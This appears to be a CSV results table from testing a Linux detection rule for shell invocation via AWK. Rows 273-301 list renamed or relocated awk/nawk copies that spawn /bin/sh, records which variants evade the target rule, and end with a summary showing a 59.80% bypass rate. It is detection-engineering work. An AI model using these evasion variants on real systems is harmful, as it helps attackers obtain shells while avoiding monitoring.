ID,Command,Log File,Result,All Detected Rules
273,"cp /bin/nawk ./n3; ./n3 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack273.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
274,"install /usr/bin/nawk /tmp/n4; /tmp/n4 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack274.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Shell Execution Of Process Located In Tmp Directory | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
275,"ln /bin/nawk /tmp/n5; /tmp/n5 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack275.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux | Execution Of Script Located In Potentially Suspicious Directory
276,"cp $(command -v nawk) ./n6; ./n6 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack276.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
277,"cp /usr/bin/awk /dev/shm/ax; /dev/shm/ax 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack277.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
278,"cp /usr/bin/awk /tmp/.awk; /tmp/.awk 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack278.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Shell Execution Of Process Located In Tmp Directory | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
279,"cp /usr/bin/awk /tmp/shellcaller; /tmp/shellcaller 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack279.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Shell Execution Of Process Located In Tmp Directory | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
280,"cp /usr/bin/awk /var/tmp/x; /var/tmp/x 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack280.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
281,"cp /usr/bin/awk ./awk1; ./awk1 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack281.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
282,"cp /usr/bin/awk ./runawk; ./runawk 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack282.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
283,"cp /usr/bin/awk ./cmd; ./cmd 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack283.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
284,"cp /usr/bin/awk ./util; ./util 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack284.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
285,"cp /usr/bin/awk ./x123; ./x123 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack285.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
286,"cp /usr/bin/awk ./zzz; ./zzz 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack286.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
287,"cp /usr/bin/awk ./starter; ./starter 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack287.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
288,"cp /usr/bin/awk ./dotcmd; ./dotcmd 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack288.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
289,"cp /usr/bin/awk ./bin.fake; ./bin.fake 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack289.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
290,"cp /usr/bin/awk ./hidden; ./hidden 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack290.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
291,"cp /usr/bin/awk ./_a; ./_a 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack291.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
292,"cp /usr/bin/awk ./z_; ./z_ 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack292.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
293,"cp /usr/bin/awk ./boot; ./boot 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack293.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
294,"cp /usr/bin/awk ./core; ./core 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack294.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
295,"cp /usr/bin/awk ./net; ./net 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack295.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
296,"cp /usr/bin/awk ./sys; ./sys 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack296.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
297,"cp /usr/bin/awk ./lsd; ./lsd 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack297.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
298,"cp /usr/bin/awk ./get; ./get 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack298.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
299,"cp /usr/bin/awk ./push; ./push 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack299.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
300,"cp /usr/bin/awk ./shellify; ./shellify 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack300.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
301,"cp /usr/bin/awk ./runtime; ./runtime 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack301.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
,,,,
,,,,
=== SUMMARY REPORT ===,,,,
Total Commands (File),301,,,
Triggered Target,84,,,
TOTAL BYPASS RATE,180 / 301 (59.80%),,,
  > Bypass All,0,,,
  > Bypass Target Rule,180,,,
Missing/Not Run,37,,,
